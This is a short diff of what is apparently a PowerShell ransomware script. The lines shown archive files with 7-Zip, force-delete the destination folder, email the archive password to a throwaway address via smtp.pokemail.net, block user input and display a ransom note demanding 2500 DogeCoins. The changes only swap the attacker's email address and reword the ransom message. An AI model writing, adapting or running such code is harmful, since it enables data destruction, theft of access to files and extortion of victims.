@@ -63,7 +63,7 @@ $p = Start-Process $pathTo64Bit7Zip -ArgumentList $arguments -Wait -PassThru -Wi
 #Delete the destination folder
 $del = Remove-Item $Destination -Force -Recurse
 
-$email = "ucjmyqhi@pokemail.net"
+$email = "8ng3vm+bbvhtmmj122ho@pokemail.net"
 
 #Send password for files to your e-mail
 $SMTPServer = "smtp.pokemail.net"
@@ -106,4 +106,4 @@ $userInput::BlockInput($false)
 Add-Type -AssemblyName System.Windows.Forms
 
 #Show the message
-$result = [System.Windows.Forms.MessageBox]::Show('We have your files!!! We demand 2500 DogeCoins for their return.', '!-Notice-!', 'Ok', 'Warning')
+$result = [System.Windows.Forms.MessageBox]::Show('We have some of your important files!!! We demand 2500 DogeCoins for their return.', '!-Notice-!', 'Ok', 'Warning')
